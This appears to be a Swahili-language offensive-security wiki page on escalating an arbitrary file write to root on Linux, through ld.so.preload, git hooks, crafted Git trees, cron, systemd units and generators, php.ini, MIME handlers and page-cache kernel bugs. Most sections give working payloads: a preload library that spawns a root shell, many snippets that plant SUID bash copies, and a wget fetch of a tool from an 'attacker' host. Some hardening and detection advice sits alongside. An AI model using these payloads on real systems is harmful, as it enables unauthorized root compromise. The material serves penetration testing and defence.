# Uandishi wa Faili Holela kwa Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` ni orodha ya mfumo mzima ya shared objects ambazo dynamic linker hupakia kabla ya shared objects nyingine. Hali ya secure-execution huweka vizuizi vya ziada kwenye preloading, kwa hivyo njia ya maktaba kama `/tmp/pe.so` si mbinu inayofanya kazi kwa binary zote za SUID.\
Ukiweza kuunda au kurekebisha faili hii, mchakato unaoipakia utapakia maktaba iliyoorodheshwa kabla ya shared objects zake nyingine, na hivyo kuruhusu utekelezaji wa msimbo katika muktadha wa mchakato huo.<sup>[[12]](#references)</sup>

Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** ni **scripts zinazoweza kutekelezwa** zinazoendeshwa wakati wa matukio kwenye repository, yakiwemo operesheni za commit na merge. Ikiwa **script au mtumiaji mwenye privileged access** atafanya vitendo hivyo na mshambuliaji anaweza **kuandika kwenye folda ya `.git`**, hook inaweza kutumiwa kwa **privilege escalation**.<sup>[[13]](#references)</sup>

Kwa mfano, inawezekana **kutengeneza script** kwenye git repo ndani ya **`.git/hooks`** ili iendeshwe kila mara commit mpya inapoundwa:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Path traversal ya export ya Git tree yenye ruhusa za juu

Synchronizer yenye ruhusa za juu inaweza kuepuka checkout na badala yake kuorodhesha repository inayodhibitiwa na mshambuliaji kwa `git ls-tree`, kusoma kila blob kwa `git cat-file`, kuunganisha pathname iliyoripotiwa na staging directory, kisha kuandika faili yenyewe. Hali hii husababisha **arbitrary file write yenye ruhusa za synchronizer** inapounganisha `-c safe.directory=*` (inayozima ulinzi wa Git dhidi ya repository inayomilikiwa na mtumiaji tofauti) na kutokagua kama destination iko ndani ya eneo linaloruhusiwa. Jina la tree entry lililo absolute husababisha Python `os.path.join(stage, name)` kuondoa `stage`; jina relative lenye `../` hutoroka wakati filesystem inapolitatua. Kwa kuwa application huandika tree ghafi badala ya kuiacha Git ifanye checkout, ukaguzi wa pathname wakati wa checkout hauilindi sehemu inayoandika.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Tafuta muundo huu wa code katika root services, timers, deployment agents, template importers na backup/restore jobs:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Ingizo la tree husimbwa kama `<mode> SP <name> NUL <raw object ID>`. Chaguo la `git hash-object --literally` huruhusu kimakusudi data ya object ambayo uchanganuzi wa kawaida au `git fsck` inaweza kukataa, kwa hivyo clone ya muda inaweza kuunda tree yenye jina la faili ambalo ni destination kamili. Mfano huu huunda blob ya faili ya cron, huifunga tree iliyoundwa kwa commit, na kuisogeza branch hadi hapo; hata hivyo, unyonyaji bado unahitaji ruhusa ya kusasisha repository inayotumiwa na kazi yenye privileges na Git server inayokubali object iliyoharibika.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Hardening lazima ihusishe uingizaji wa repository na operesheni ya mwisho ya mfumo wa faili:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Badilisha `safe.directory=*` na orodha ya repository mahususi ambazo huduma inapaswa kuamini, na inapowezekana, chakata repository bila ruhusa za root.
- Kataa majina kamili ya njia na kipengele chochote cha `.` au `..` kabla ya kuunda faili. Baada ya kuunganisha njia, ifanye iwe ya kanoniki na uhakikishe kuwa lengwa linabaki ndani ya mzizi uliokusudiwa.
- Epuka race ya symlink ya kuangalia kisha kufungua: fungua ukitumia descriptor ya saraka inayoaminika na, kwenye Linux, tumia `openat2()` pamoja na `RESOLVE_BENEATH` na `RESOLVE_NO_SYMLINKS` kwa njia zinazodhibitiwa na mshambuliaji.
- Pendelea checkout ya kawaida katika saraka iliyotengwa badala ya kutekeleza upya checkout kutoka kwenye matokeo ya plumbing. Ikiwa uingizaji wa raw-object unahitajika, washa uthibitishaji wa upande wa receive kama `receive.fsckObjects=true`; usipunguze ukali wa matokeo ya `receive.fsck.*` yanayohusiana na pathname na yanayohitajika kukataa trees zilizoundwa kwa makusudi.

### Usambazaji wa usanidi wenye mamlaka ya juu

Baadhi ya huduma za usimamizi huhifadhi hali ya mfumo inayokusudiwa katika faili ya usanidi na baadaye kuisambaza kwa kutumia ruhusa za juu. Kwa mfano, [openmediavault huhifadhi usanidi katika `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), na [RPC interface](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) yake inaweza kutumia mabadiliko ya huduma. Ikiwa akaunti yenye ruhusa za chini inaweza kuandika au kubadilisha faili hiyo, chunguza kama inaweza pia kuomba usambazaji ulioidhinishwa na kama module iliyochaguliwa hutumia sehemu iliyobadilishwa ikiwa root. Vifunguo vya akaunti za SSH, amri zilizopangwa kuratibiwa, na usakinishaji wa package vina masharti tofauti; kuwepo tu kwa faili au XML inayoweza kuandikwa hakuthibitishi mojawapo ya haya. Kagua ruhusa za faili na saraka mama, vikundi vya mtumiaji anayeomba na uidhinishaji wa RPC, toleo lililosakinishwa, na mtumiaji halisi wa usanidi huo bila kuhariri usanidi au kuendesha operesheni ya apply wakati wa ukaguzi.

Ufafanuzi wa action wa Fail2Ban ulio chini ya `/etc/fail2ban/action.d/` ni mpaka mwingine wa usanidi wenye mamlaka ya juu. Mtumiaji anayeweza kuandika na kutafuta ndani ya saraka hiyo anaweza kubadilisha ufafanuzi wa action au kuongeza override, lakini ruhusa za saraka pekee hazithibitishi utekelezaji wa code. Thibitisha kuwa jail iliyowashwa inachagua action iliyoathiriwa, kuwa huduma ya Fail2Ban inaiendesha kwa mamlaka ya juu, na kuwa reload/restart iliyoidhinishwa pamoja na tukio la ban linalolingana vitatokea. Ruhusa isiyohusiana ya sudo ya kuanzisha upya Fail2Ban ni muhimu tu ikiwa inahusu mwito halisi wa huduma na ufafanuzi uliobadilishwa unapakiwa. [Usanidi wa action wa Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) unaeleza uhusiano kati ya saraka ya action na jail; [mfano wa action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) unaonyesha kuwa `actionban` huendeshwa wakati wa ban kwa haki za mtumiaji wa huduma. Kagua ruhusa na usanidi unaotumika bila kubadilisha actions au kuanzisha bans wakati wa ukaguzi.

Mpaka tofauti hutokea pale jail ya Fail2Ban iliyowashwa inapotumia action ya barua pepe iliyoboreshwa kwa WHOIS. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) ilihusu maandishi ya WHOIS yasiyoaminika yaliyopitishwa kwa GNU mailutils `mail`, ambayo uchakataji wake wa escape ungeweza kuendesha amri. Mtumiaji wa ruhusa za chini anayeweza kuandika faili anaweza kuathiri jibu ikiwa anaweza kubadilisha usanidi wa kubatilisha seva wa **WHOIS client iliyochaguliwa**; [whois.conf(5) ya Debian](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) inaeleza faili mojawapo ya aina hiyo, lakini njia na matumizi yake hutofautiana kulingana na usakinishaji. Kagua jail/action inayotumika, utambulisho wa huduma, WHOIS client na njia halisi ya usanidi, utekelezaji wa mail, uwezo wa kudhibiti jibu, na marekebisho au backport ya vendor iliyosakinishwa. Faili ya usanidi wa WHOIS inayoweza kuandikwa, toleo la Fail2Ban, au action ya mail pekee havithibitishi mnyororo huu; epuka kutuma ombi kwa seva ya nje au kuanzisha bans wakati wa ukaguzi usioathiri mfumo.

### Uundaji wa faili kwa TFTP na hooks za package zenye mamlaka ya juu

Huduma ya TFTP inayoweza kufikiwa inaweza kuvuka mpaka wa container au mtumiaji wa ndani ikiwa mipangilio **inayotumika** ya tftpd-hpa inaifanya iendeshwe kama root, inaweka mzizi wa mfumo wa faili kama saraka ya `--secure`, na kuwasha `--create`. [Mwongozo wa tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) unaeleza chaguo za uundaji na mtumiaji. Hii ni njia inayoweza kutumiwa kuunda faili mpya katika saraka ya usanidi yenye mamlaka ya juu, ikiwemo `/etc/apt/apt.conf.d/`; faili iliyopo bado inaweza kukataa kubadilishwa. [Mwongozo wa usanidi wa APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) unaeleza amri za `APT::Update::Pre-Invoke`. `apt update` inayoendeshwa kama root inaweza kuwa mtumiaji mwenye mamlaka ya juu **ikiwa tu** itasoma faili mpya ya usanidi. Thibitisha hoja halisi na utambulisho wa daemon inayoendesha, ufikikaji wa mtandao na uchujaji, sera ya uundaji wa faili ya saraka lengwa, wigo wa usanidi unaotumika wa APT, na mwito wa baadaye wenye mamlaka ya juu. Faili ya chaguomsingi, saraka lengwa inayoweza kuandikiwa, au amri ya APT iliyoratibiwa pekee haithibitishi njia nzima. Uchunguzi usioathiri mfumo unapaswa kusoma usanidi na metadata ya ndani iliyo na mipaka pekee, bila kupakia faili au kuendesha APT.

### Faili za Cron na wakati

Ukiweza **kuandika faili zinazohusiana na cron ambazo root huendesha**, kwa kawaida unaweza kupata utekelezaji wa code mara tu kazi hiyo itakapoendeshwa tena. Malengo ya kuvutia ni pamoja na:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- crontab ya root yenyewe katika `/var/spool/cron/` au `/var/spool/cron/crontabs/`
- timers za `systemd` na huduma zinazoanzishwa nazo

Ukaguzi wa haraka:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Njia za kawaida za kutumia vibaya:

- **Ongeza cron job mpya ya root** kwenye `/etc/crontab` au faili ndani ya `/etc/cron.d/`
- **Badilisha script** ambayo tayari inaendeshwa na `run-parts`
- **Weka backdoor kwenye timer target iliyopo** kwa kurekebisha script au binary inayozinduliwa nayo

Mfano wa chini kabisa wa cron payload:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Ikiwa unaweza kuandika tu ndani ya saraka ya cron inayotumiwa na `run-parts`, weka faili inayoweza kutekelezwa humo badala yake:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Vidokezo:

- `run-parts` kwa kawaida hupuuza majina ya faili yenye nukta, kwa hivyo pendelea majina kama `backup` badala ya `backup.sh`.<sup>[[15]](#references)</sup>
- Baadhi ya mifumo hutumia vipima muda vya `systemd` badala ya cron ya kawaida, lakini wazo la matumizi mabaya ni lilelile: **rekebisha kitu ambacho root itatekeleza baadaye**.<sup>[[20]](#references)</sup>

### Faili za Service & Socket

Ikiwa unaweza kuandika **faili za unit za `systemd`** au faili zinazorejelewa nazo, unaweza kupata utekelezaji wa msimbo kama root kwa kupakia upya na kuwasha upya unit, au kusubiri njia ya uanzishaji wa service/socket ianzishe unit.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Pia kagua ruhusa za kuandika na kutafuta kwenye saraka ya unit za mfumo yenyewe, ikijumuisha ACL: mtumiaji anaweza kuunda unit mpya katika `/etc/systemd/system` hata kama haruhusiwi kusoma/kuorodhesha yaliyomo kwenye saraka. Njia hiyo pekee haiwashi chochote. Thibitisha kuwa system manager itapakia unit mpya, kwamba mtumiaji ana ruhusa halali ya `systemctl start` au `restart` yenye uwezo wa root kwa jina lake (au njia nyingine ya uanzishaji yenye upendeleo), na kwamba service inaendeshwa kwa utambulisho uliokusudiwa. Unit iliyopo na iliyopakiwa ambayo imebadilishwa kwenye diski inaweza kuhitaji `daemon-reload`; unit yenye jina jipya hupakiwa kwa utaratibu tofauti. Kagua hoja na vizuizi halisi vya sudo kabla ya kudhani kuwa sheria ya kuwasha upya inayotumia wildcard inatosha. Angalia [njia ya utafutaji ya unit za systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) na [semantiki za upakiaji na upakiaji upya za systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Malengo ya kuvutia ni pamoja na:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Ubatilishaji wa drop-in katika `/etc/systemd/system/<unit>.d/*.conf`
- Script/programu za Service zinazorejelewa na `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Njia za `EnvironmentFile=` zinazoweza kuandikwa na kupakiwa na service ya root

Ukaguzi wa haraka:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Njia za kawaida za matumizi mabaya:

- **Kubadilisha `ExecStart=`** katika service unit inayomilikiwa na root ambayo unaweza kuhariri
- **Kuongeza drop-in override** yenye `ExecStart=` hasidi na kwanza kufuta ile ya zamani
- **Kuweka backdoor kwenye script/binary** ambayo unit tayari inarejelea
- **Kutekwa kwa service iliyoanzishwa na socket** kwa kurekebisha faili husika la `.service` linaloanzishwa socket inapopokea muunganisho

Mfano wa override hasidi:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Mtiririko wa kawaida wa uanzishaji:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Ikiwa huwezi kuwasha upya services mwenyewe lakini unaweza kuhariri unit inayoamilishwa na socket, huenda unahitaji tu **kusubiri muunganisho wa client** ili kuchochea kuendeshwa kwa service iliyowekewa backdoor kama root.<sup>[[17]](#references)</sup>

### Saraka za systemd generator

**System generators** ni programu zinazotekelezwa na system manager kabla haijapakia unit files, wakati wa boot na wakati wa kupakia upya usanidi. Kwa hiyo, ruhusa ya kuandika kwenye saraka ya system-generator (au kwenye generator executable iliyopo) ni njia ya moja kwa moja ya kutekeleza code kama root ambayo ni rahisi kukosa wakati ukaguzi unapoangalia faili za `*.service` na `*.timer` pekee.<sup>[[35]](#references)[[36]](#references)</sup>

Mpangilio wa kawaida wa utafutaji ni `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/`, na `/usr/lib/systemd/system-generators/` (baadhi ya distributions huonyesha `/lib/systemd/system-generators/` kupitia muunganiko wa `/usr`). Executable yenye jina sawa katika saraka ya mapema hufunika ile iliyo katika saraka za baadaye. Usichanganye **saraka za executable za ingizo** hizi na `/run/systemd/generator`, `/run/systemd/generator.early`, na `/run/systemd/generator.late`, ambazo zina matokeo ya unit ya muda yanayotengenezwa na generators.<sup>[[35]](#references)</sup>

Ukaguzi wa haraka:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Generator iliyoundwa hivi karibuni lazima iwekwe alama ya executable. Ikiwa write primitive inadhibiti bytes lakini si mode, lenga generator ambayo tayari ni executable; kuifuta yaliyomo bila kuibadilisha kwa kawaida huhifadhi metadata yake. Ikiwa directory yenyewe inaweza kuandikwa, unda entry mpya na uiweke alama ya executable.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Kuanzisha `systemctl daemon-reload` dhidi ya manager ya **system** kunahitaji idhini inayofaa, lakini huendesha tena kila system generator; la sivyo, subiri reload yenye ruhusa za juu, operesheni ya kifurushi, au kuwasha upya. Saraka za user-generator kama `~/.config/systemd/user-generators/` huendeshwa chini ya user manager na **hazitoi root zenyewe**.<sup>[[35]](#references)</sup>

Kwa hardening na hunting, thibitisha kila sehemu ya njia na ACL badala ya kuangalia bits za ruhusa za mwisho pekee, weka rekodi ya msingi ya hashes/umiliki wa vifurushi vya generators, na toa arifa kuhusu uundaji, kubadilisha jina, mabadiliko ya maudhui au ruhusa katika saraka zote za ingizo za system-generator. Kufuatilia uandishi ni muhimu kwa sababu generator ya mara moja inaweza kujifuta baada ya kutekelezwa, huku mti wa unit uliotengenezwa chini ya `/run/systemd/generator*` ukijengwa upya wakati wa reload inayofuata.<sup>[[35]](#references)[[36]](#references)</sup>

### Andika juu ya `php.ini` yenye vizuizi inayotumiwa na PHP sandbox yenye ruhusa za juu

Baadhi ya daemon maalum hukagua PHP iliyotolewa na mtumiaji kwa kuendesha `php` yenye **`php.ini` yenye vizuizi** (kwa mfano, `disable_functions=exec,system,...`). Ikiwa msimbo ulio kwenye sandbox bado una **uwezo wowote wa kuandika** (kama `file_put_contents`) na unaweza kufikia **njia halisi ya `php.ini`** inayotumiwa na daemon, unaweza **kuandika juu ya config hiyo** ili kuondoa vizuizi, kisha utume payload ya pili inayotekelezwa kwa ruhusa za juu.<sup>[[2]](#references)</sup>

Mtiririko wa kawaida:

1. Payload ya kwanza inaandika juu ya config ya sandbox.
2. Payload ya pili hutekeleza msimbo sasa kwa kuwa functions hatari zimewezeshwa tena.

Mfano wa chini kabisa (badilisha njia itumiwayo na daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Ikiwa daemon inaendeshwa kama root (au inathibitisha kwa kutumia paths zinazomilikiwa na root), utekelezaji wa pili huleta muktadha wa root. Hii kimsingi ni **privilege escalation kupitia config overwrite** pale runtime iliyowekwa kwenye sandbox inapoweza kuandika faili.

### binfmt_misc

`binfmt_misc` huweka registrations kwenye `/proc/sys/fs/binfmt_misc`; kila registration huhusisha muundo wa aina ya faili na interpreter. Athari kwa privileges hutegemea ni nani anayeweza kubadilisha registration na ni mchakato gani unaotekeleza faili inayolingana baadaye. Kwa hiyo, hakikisha mahitaji hayo yametimizwa kabla ya kuchukulia hili kama njia ya privilege escalation.<sup>[[21]](#references)</sup>

Helper inayoweza kutekelezwa yenye `CAP_DAC_OVERRIDE` inaweza kutoa njia tofauti ya registration ikiwa inakubali data inayodhibitiwa na caller na kuiandika kwenye `/proc/sys/fs/binfmt_misc/register`, hata kama caller hawezi kuandika moja kwa moja kwenye node hiyo. Kagua ingizo la helper na jinsi inavyoandika bila kuitekeleza wakati wa enumeration. Ikiwa rule iliyosajiliwa inatumia flag ya `C`, interpreter hupokea credentials kulingana na binary iliyolingana; kwa hiyo, faili ya SUID inayomilikiwa na root inaweza kuendesha interpreter inayodhibitiwa na caller kama root. Thibitisha mount ya `binfmt_misc` na sera ya registration, uwezo halisi wa helper, rule na interpreter path halisi, target ya SUID inayoweza kutekelezwa, na kama `no_new_privs` au mount ya `nosuid` inazuia mabadiliko ya SUID. Capability bit au mfuatano wa path uliopachikwa pekee ni kidokezo cha ukaguzi tu.<sup>[[21]](#references)</sup> Angalia [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) kwa masharti yanayozuia SUID.

### Andika upya schema handlers (kama http: au https:)

Desktop environments hutumia MIME associations na desktop entries kuchagua programu ya kushughulikia URI schemes; mshambuliaji anayeweza kuandika kwenye configuration ya mtumiaji husika na directories za desktop entries anaweza kuelekeza schemes hizo kwenye launcher anayoidhibiti. Kwa kubadilisha faili ya `$HOME/.config/mimeapps.list` ili HTTP na HTTPS URL handlers zielekezwe kwenye faili hasidi (kwa mfano, `x-scheme-handler/http=evil.desktop` na `x-scheme-handler/https=evil.desktop`), kubofya kwa mtumiaji kunaweza kuanzisha desktop entry hiyo.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root ikitekeleza scripts/binaries zinazoweza kuandikwa na mtumiaji

Ikiwa mchakato wenye ruhusa za juu utaendesha kitu kama `/bin/sh /home/username/.../script` (au binary yoyote iliyo ndani ya directory inayomilikiwa na mtumiaji asiye na ruhusa za juu), unaweza kuiteka:<sup>[[1]](#references)</sup>

- **Tambua utekelezaji:** fuatilia processes kwa kutumia pspy ili kugundua root ikiendesha paths zinazodhibitiwa na mtumiaji.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Thibitisha ruhusa ya kuandika:** hakikisha faili lengwa na saraka yake vyote vinamilikiwa na mtumiaji wako na unaweza kuviandikia.
- **Tekeleza hijack ya lengo:** weka nakala rudufu ya binary/script asili, kisha weka payload inayounda shell ya SUID (au kutekeleza kitendo kingine chochote cha root), halafu rejesha ruhusa:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Anzisha kitendo chenye privileged** (kwa mfano, kubonyeza kitufe cha UI kinachozindua helper). Root ikitekeleza tena path iliyotekwa, pata shell yenye escalated privileges kwa `./rootshell -p`.

### Urekebishaji wa faili za binary zenye privileged unaoishia kwenye page cache pekee

Baadhi ya kernel bugs hazibadilishi faili **kwenye diski**. Badala yake, hukuwezesha kubadilisha nakala ya faili inayoweza kusomeka iliyo kwenye **page cache** pekee. Ukiweza kulenga binary ya **setuid** au inayotekelezwa na **root** kwa njia nyingine, utekelezaji unaofuata unaweza kuendesha bytes zinazodhibitiwa na mshambuliaji kutoka kwenye kumbukumbu na kupandisha privileges, ingawa hash ya faili kwenye diski haijabadilika.<sup>[[3]](#references)[[4]](#references)</sup>

Ni muhimu kufikiria hili kama **primitive ya kuandika faili wakati wa runtime pekee**:<sup>[[3]](#references)</sup>

- **Diski hubaki safi**: inode na bytes zilizo kwenye diski hazibadiliki
- **Kumbukumbu huwa na mabadiliko**: processes zinazosoma/kuendesha ukurasa ulio kwenye cache hupata maudhui yaliyobadilishwa na mshambuliaji
- **Athari ni ya muda**: mabadiliko hupotea baada ya kuwasha upya au cache kufutwa

Primitive hii iko kati ya **uandikaji wa faili kiholela** wa kawaida na bugs za zamani za **matumizi mabaya ya page cache** kama Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW ilitegemea race
- Dirty Pipe ilikuwa na vikwazo vya nafasi ya kuandika
- Primitive inayohusu page cache pekee inaweza kuwa ya kutegemewa zaidi ikiwa njia iliyo hatarini inawezesha uandishi wa moja kwa moja kwenye kurasa za faili zilizo kwenye cache

#### Mtiririko wa jumla wa privesc

1. Pata kernel primitive inayoweza kuandika kwenye **kurasa za page cache zinazoungwa mkono na faili**
2. Itumie dhidi ya **binary yenye privileged inayoweza kusomwa** au faili nyingine inayotekelezwa na root
3. Anzisha utekelezaji **kabla** ukurasa haujaondolewa kwenye cache
4. Pata utekelezaji wa msimbo kama root huku faili iliyo kwenye diski ikiendelea kuonekana haijabadilishwa

Malengo ya kawaida yenye thamani kubwa:

- Binaries za **setuid-root**
- Helpers zinazoanzishwa na **root services**
- Binaries zinazoendeshwa mara nyingi kutoka kwenye **containers zinazoshiriki kernel/page cache ya host**

#### Njia ya mfano ya AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) ni mfano mzuri wa aina hii. Njia iliyo hatarini ilikuwa kwenye API ya Linux crypto userspace (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` inaweza kuhamisha marejeleo ya kurasa za page cache kutoka kwenye faili inayoweza kusomwa hadi kwenye crypto TX scatterlist
- njia ya decryption ya `algif_aead` inayofanyia kazi buffer zilezile ilitumia tena buffer za chanzo na lengwa
- kisha `authencesn` ikaandika kwenye eneo la tag la lengwa
- eneo hilo liliporejelea kurasa za faili zilizowekwa kwenye cache kupitia splice, uandishi uliishia kwenye **page cache ya faili lengwa**

Kwa hiyo, mbinu inayovutia si CVE yenyewe, bali muundo huu:

- **ingiza kurasa za cache zinazoungwa mkono na faili kwenye kernel subsystem**
- ifanye subsystem **izichukulie kama matokeo yanayoweza kuandikwa**
- anzisha overwrite ndogo inayodhibitiwa kwenye kumbukumbu

Public PoC ilitumia **uandishi wa bytes 4** unaorudiwa kurekebisha `/usr/bin/su` kwenye kumbukumbu, kisha ikaitekeleza.<sup>[[4]](#references)[[7]](#references)</sup>

#### Njia ya mfano ya ESP / XFRM + netfilter TEE clone

DirtyClone (CVE-2026-43503) inaonyesha namna nyingine ya muundo huohuo wa **kuandika kwenye page cache pekee ili kupata root**, lakini safari hii sehemu inayopokea data ni **IPsec ESP decrypt** badala ya `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Mbinu muhimu ni hatua ya **kuficha asili ya metadata**:

- `splice()` huweka ukurasa wa page cache wa faili ya **kusoma pekee** ndani ya pakiti ya ESP-in-UDP
- kinga ya awali ya DirtyFrag iliweka alama `SKBFL_SHARED_FRAG` kwenye skb ili `esp_input()` **inakili kabla ya kufanya decryption**
- netfilter `TEE` hunakili pakiti kupitia `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- nakala hiyo huhifadhi **rejeleo lilelile la ukurasa halisi wa page cache** lakini hupoteza `SKBFL_SHARED_FRAG`
- kisha `esp_input()` huichukulia nakala hiyo kuwa salama na kufanya decryption ya **`cbc(aes)` inayotumia buffer hiyohiyo** juu ya ukurasa unaoungwa mkono na faili

Somo kwa wakaguzi ni pana zaidi ya CVE hii: ikiwa kinga inategemea **metadata ya skb/ukurasa** kuamua kama operesheni lazima ianze kwa kunakili, njia yoyote ya **clone/copy inayohifadhi ukurasa wa msingi lakini kuondoa metadata** inaweza kufungua tena primitive ya uandishi bila kuonekana.

Mtiririko wa kawaida wa exploitation:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` ili kupata **`CAP_NET_ADMIN` ndani ya private network namespace**
2. washa loopback na usakinishe sheria ya **netfilter `TEE`** kwenye `mangle/OUTPUT`
3. sakinisha XFRM ESP transport SAs kupitia `NETLINK_XFRM`
4. encode kila neno lengwa la bytes 4 kwenye sehemu ya SA `seq_hi` (mbinu ya DirtyFrag ya kuchagua neno)
5. tuma pakiti ya ESP-in-UDP iliyowekwa kwa splice ili **TEE clone** ifike `esp_input()` na kufanya decryption **kwenye buffer hiyohiyo**
6. rudia hadi nakala ya page cache ya `/usr/bin/su` au executable nyingine yenye privileged iwe na msimbo unaodhibitiwa na mshambuliaji

Kwa upande wa utendaji, athari ni sawa na mfano wa `AF_ALG`: faili kwenye diski hubaki safi, lakini `execve()` hutumia **bytes zilizobadilishwa kwenye page cache** na kutoa root.<sup>[[8]](#references)[[9]](#references)</sup>

Ukaguzi muhimu wa kubaini hatari kwa variant hii:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Kupunguza attack surface kwa muda mfupi pia kunategemea path hapa: kuboresha hadi kernel yenye `48f6a5356a33` hurekebisha clone path, huku kuzuia upakiaji otomatiki wa `xt_TEE` kukiondoa **hatua ya kuficha flag**, na kuzuia `esp4` / `esp6` kukiondoa **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Kufichuliwa na hunting

Ikiwa unashuku aina hii ya hitilafu, usitegemee ukaguzi wa uadilifu wa diski pekee. Pia hakikisha:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

